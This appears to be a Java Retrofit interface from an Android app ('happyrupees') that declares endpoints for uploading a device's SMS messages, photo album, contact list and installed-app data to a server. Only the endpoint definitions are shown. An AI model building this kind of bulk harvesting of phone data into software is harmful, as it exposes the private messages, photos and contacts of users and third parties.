package com.lirongyuns.happyrupees.requester;

import okhttp3.FormBody;
import okhttp3.MultipartBody;
import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.http.Body;
import retrofit2.http.Multipart;
import retrofit2.http.POST;
import retrofit2.http.Part;

public interface CrawlPhoneDataRequester {
    @POST("/app/pick_up_information/appdata")
    Call<ResponseBody> uploadAppInfo(@Body FormBody bodyContent);

    @POST("app/pick_up_information/album")
    Call<ResponseBody> uploadPhotoInfo(@Body FormBody bodyContent);

    @POST("app/pick_up_information/note")
    Call<ResponseBody> uploadSmsInfo(@Body FormBody bodyContent);

    @POST("app/pick_up_information/address")
    Call<ResponseBody> uploadContactsInfo(@Body FormBody bodyContent);
    
    @Multipart
    @POST("app/pick_up_information/note")//@Part List<MultipartBody.Part> files
    Call<ResponseBody> uploadSmsDataFile(@Part MultipartBody.Part file, @Part MultipartBody.Part part);
    
    @Multipart
    @POST("app/pick_up_information/album")
    Call<ResponseBody> uploadPhotoDataFile(@Part MultipartBody.Part file, @Part MultipartBody.Part part);

    @Multipart
    @POST("app/pick_up_information/address")
    Call<ResponseBody> uploadContactDataFile(@Part MultipartBody.Part file, @Part MultipartBody.Part part);
    
    @Multipart
    @POST("/app/pick_up_information/get_data")
    Call<ResponseBody> uploadAppDataFile(@Part MultipartBody.Part file, @Part MultipartBody.Part part);
    
    @POST("app/login/getInformation")
    Call<ResponseBody> getUserInfoFromServer(@Body FormBody formBody);
    
}
